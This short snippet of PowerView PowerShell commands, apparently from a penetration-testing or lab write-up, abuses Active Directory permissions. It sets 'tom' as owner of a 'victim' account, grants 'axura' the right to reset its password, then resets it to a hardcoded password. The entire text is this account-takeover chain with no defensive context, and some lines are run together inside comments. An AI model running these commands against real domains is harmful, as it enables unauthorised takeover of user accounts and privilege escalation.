
Set-DomainObjectOwner -Identity victim -OwnerIdentity tom 

# Assign 'axura' permissions to reset passwords on 'victim' object 

Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity axura -Rights ResetPassword 
# Create a PowerShell secure string for the new password and reset password of 'victim' $newPassword = ConvertTo-SecureString "Axura@4sure1377" -AsPlainText -Force Set-DomainUserPassword -Identity victim -AccountPassword $newPassword